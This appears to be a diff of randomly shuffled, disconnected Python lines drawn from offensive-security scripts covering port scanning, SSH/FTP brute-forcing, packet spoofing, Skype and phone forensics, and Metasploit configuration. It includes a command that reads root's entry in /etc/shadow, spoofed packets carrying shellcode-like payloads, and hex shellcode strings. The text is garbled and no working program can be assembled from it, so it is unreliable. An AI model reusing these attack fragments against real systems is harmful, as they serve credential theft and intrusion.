@@ -1,0 +1,113 @@
+    ftp.retrlines('RETR ' + page, f.write)
+        t.start()
+def connect(user, host, password):
+        connSkt = socket(AF_INET, SOCK_STREAM)
+    for tgtPort in tgtPorts:
+            child.sendline('yes')
+import ftplib
+google('Boondock Saint')
+    search_term = urllib.quote_plus(search_term)
+        files = os.listdir(recycleDir + sid)
+            s.login(self.host, self.user, self.password)
+            if link.has_key('href'):
+def printLinks(url):
+    send(ackPkt)
+    pkt = IP(src=src,dst=dst)/ICMP(type=0,id=456)
+def printMeta(fileName):
+    urlContent = urllib2.urlopen(url).read()
+            text = row[2]
+            if state == 'open':
+viewPage('http://www.syngress.com/')
+    for x in range(1, 5):
+    pkt = IP(src=src, dst=dst) / UDP(dport=635) /Raw(load="^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
+                stream = src + ':' + dst
+def findHivemind(pcap):
+    f = open(pcapFile)
+        pktsSent = pktCount[stream]
+    if options.pcapFile == None:
+        longitude = rec['longitude']
+    source_code = page.read()
+def calTSN(tgt):
+def printCallLog(skypeDB):
+        password = password.strip('\\n').strip('\r')
+            ftp.quit()
+            if dport == 6667:
+import urlparse
+        links = link_finder.findall(html)
+"\xfa\x86\x0b\x78\xfa\x82\xfb\x19\x69\x49\xfb\x54\x92\xc6" 
+            guid = EnumKey(key, i)
+                    pktCount[stream] = 1
+import dpkt
+    send_command(child, 'cat /etc/shadow | grep root')
+    image_tags = soup.findAll('img')
+def returnDefault(ftp):
+     Fails += 1
+def send_command(child, cmd):
+"\x48\x2d\x76\xe3\xb5\x64\xf3\xd0\x4e\x77\xd5\x28\xae\x49" 
+            ttl = str(pkt.ttl)
+        else:
+    soup = BeautifulSoup(html)
+elif 'synchronize with original prompt' in str(e):
+    s.connect((target,21))
+    seqNum = calTSN(tgt) + 1
+        fullpath = os.path.join(passDir, filename)
+        connSkt.connect((tgtHost, tgtPort))
+    for tgtHost in tgtHosts:
+        try:
+            src = socket.inet_ntoa(ip.src)
+    rLat = re.findall(r'maplat=.*\&', resp)
+    if (options.tgtHost == None) | (options.lhost == None):
+    pktCount = {}
+        links = soup.findAll(name='a')
+                    printMessage(iphoneDB)
+             password, True))
+    for (ts, buf) in pcap:
+    response = ab.open('http://kittenwar.com')
+    tgtPorts = str(options.tgtPort).split(',')
+        child.sendline('yes')
+if len(sys.argv) < 2:
+        if os.path.isfile(cookiesDB):
+THRESH = 1000
+    for cookie in cookie_jar:
+if release: connection_lock.release()
+        try:
+        if os.path.isdir(recycleDir):
+            srcKML = retKML(src)
+    ab.anonymize()
+    for (ts, buf) in pcap:
+    dir = options.dir
+s.recv(1024)
+    pkt = IP(src=src, dst=dst) / UDP(dport=7) /Raw(load='cybercop')
+            ftp.login(userName, passWord)
+    reqData = urllib.urlencode({'credential_0': username,
+           retList.append(fileName)
+        pkt = IP(dst=tgt) / TCP()
+def findAttack(pcap):
+    f = open('geotest.pcap')
+    (options, args) = parser.parse_args()
+    if options.iface == None:
+    lat = rec['latitude']
+    browser.open('http://wigle.net')
+        url = result['url']
+                exifData[decoded] = value
+        rdata = pkt.getlayer(DNSRR).rdata
+    parser = optparse.OptionParser("usage %prog "+ "-p <skype profile path> ")
+        dirList = os.listdir(pathName)
+     sys.exit(0)
+from threading import *
+                uri = http.uri.lower()
+"\xdb\x70\xe2\x64\x1f\x12\x9e\x76\x73\xf4\x9f\xb8\x86\xf5" 
+import mechanize
+       + '\\' + sid)
+                      help='specify wigle password')
+            date = str(row[1])
+            dport = tcp.dport
+from threading import *
+    pcapFile = options.pcapFile
+    for image in image_tags:
+    parser = optparse.OptionParser('usage %prog -H <target host> -p <target port>')
+def dnsQRTest(pkt):
+import pxssh
+    configFile.write('set payload '+\
+             password = line.strip('\r').strip('\\n')
+def printMessages(skypeDB):
